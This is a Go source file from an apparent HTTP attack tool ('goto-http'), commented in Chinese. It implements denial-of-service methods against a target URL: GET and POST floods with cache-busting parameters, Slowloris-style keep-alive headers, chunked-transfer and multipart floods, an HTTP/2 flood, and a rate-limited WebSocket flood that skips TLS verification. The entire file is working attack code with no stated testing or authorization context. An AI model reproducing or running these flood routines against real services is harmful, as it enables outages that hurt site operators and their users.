package attack

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"goto-http/pkg/protocol/websocket"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
	"time"
)

// AttackMethodHandler 攻击方法处理器
type AttackMethodHandler interface {
	Execute(ctx context.Context, target string, opts *Options) error
}

// BaseAttackMethod 基础攻击方法
type BaseAttackMethod struct {
	client  *http.Client
	opts    *Options
	stats   *Stats
	timeout time.Duration
}

// GetFlood GET洪水攻击
func (b *BaseAttackMethod) GetFlood(ctx context.Context, target string) error {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return err
	}

	// 添加随机查询参数避免缓存
	q := req.URL.Query()
	q.Add("_", fmt.Sprintf("%d", time.Now().UnixNano()))
	req.URL.RawQuery = q.Encode()

	return b.sendRequest(req)
}

// PostFlood POST洪水攻击
func (b *BaseAttackMethod) PostFlood(ctx context.Context, target string) error {
	body := generateRandomBody(1024) // 1KB随机数据
	req, err := http.NewRequestWithContext(ctx, "POST", target, bytes.NewReader(body))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	return b.sendRequest(req)
}

// SlowLoris Slowloris攻击
func (b *BaseAttackMethod) SlowLoris(ctx context.Context, target string) error {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return err
	}

	// 设置特殊的头部
	req.Header.Set("X-a", strings.Repeat("a", 1024))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Keep-Alive", "300")

	return b.sendRequest(req)
}

// ChunkFlood 分块传输洪水攻击
func (b *BaseAttackMethod) ChunkFlood(ctx context.Context, target string) error {
	pr, pw := io.Pipe()
	req, err := http.NewRequestWithContext(ctx, "POST", target, pr)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Transfer-Encoding", "chunked")

	go func() {
		defer pw.Close()
		for i := 0; i < 1000; i++ {
			chunk := make([]byte, 1024)
			rand.Read(chunk)
			fmt.Fprintf(pw, "%x\r\n%s\r\n", len(chunk), chunk)
			time.Sleep(time.Millisecond * 100)
		}
		fmt.Fprintf(pw, "0\r\n\r\n")
	}()

	return b.sendRequest(req)
}

// MultipartFlood 多部分表单洪水攻击
func (b *BaseAttackMethod) MultipartFlood(ctx context.Context, target string) error {
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// 添加多个随机字段
	for i := 0; i < 10; i++ {
		fieldName := fmt.Sprintf("field%d", i)
		field, err := writer.CreateFormField(fieldName)
		if err != nil {
			return err
		}
		field.Write(generateRandomBody(1024))
	}

	writer.Close()

	req, err := http.NewRequestWithContext(ctx, "POST", target, &buf)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())
	return b.sendRequest(req)
}

// HTTP2Flood HTTP/2洪水攻击
func (b *BaseAttackMethod) HTTP2Flood(ctx context.Context, target string) error {
	// 确保使用HTTP/2
	b.opts.HTTP2 = true

	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return err
	}

	// 添加HTTP/2特定的头部
	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-encoding", "gzip, deflate, br")
	req.Header.Set("accept-language", "en-US,en;q=0.9")

	return b.sendRequest(req)
}

// WSFlood WebSocket洪水攻击
func (b *BaseAttackMethod) WSFlood(ctx context.Context, target string) error {
	// 创建 WebSocket 客户端选项
	wsOptions := websocket.DefaultClientOptions()
	wsOptions.Timeout = b.timeout
	wsOptions.Compression = true
	wsOptions.SkipVerify = true // 跳过 TLS 验证
	wsOptions.Headers = make(map[string]string)

	// 从基础选项复制 headers
	for k, v := range b.opts.Headers {
		if len(v) > 0 {
			wsOptions.Headers[k] = v[0]
		}
	}

	// 创建 WebSocket 客户端
	wsClient := websocket.NewClient(wsOptions)

	// 连接到 WebSocket 服务器
	if err := wsClient.Connect(target); err != nil {
		return fmt.Errorf("failed to connect to WebSocket server: %v", err)
	}
	defer wsClient.Close()

	// 发送洪水消息
	message := []byte(b.opts.Body)
	if len(message) == 0 {
		message = []byte("flood message")
	}

	// 设置速率限制
	ticker := time.NewTicker(time.Second / time.Duration(b.opts.Rate))
	defer ticker.Stop()

	// 发送消息循环
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			if err := wsClient.Send(message); err != nil {
				return fmt.Errorf("failed to send WebSocket message: %v", err)
			}
		}
	}
}

// 辅助函数

// generateRandomBody 生成随机数据
func generateRandomBody(size int) []byte {
	body := make([]byte, size)
	rand.Read(body)
	return body
}

// generateWSKey 生成WebSocket密钥
func generateWSKey() string {
	key := make([]byte, 16)
	rand.Read(key)
	return base64.StdEncoding.EncodeToString(key)
}

// sendRequest 发送请求
func (b *BaseAttackMethod) sendRequest(req *http.Request) error {
	// 添加通用头部
	for k, v := range b.opts.Headers {
		if len(v) > 0 {
			req.Header.Set(k, v[0])
		}
	}

	resp, err := b.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// 读取并丢弃响应体
	io.Copy(io.Discard, resp.Body)

	return nil
}
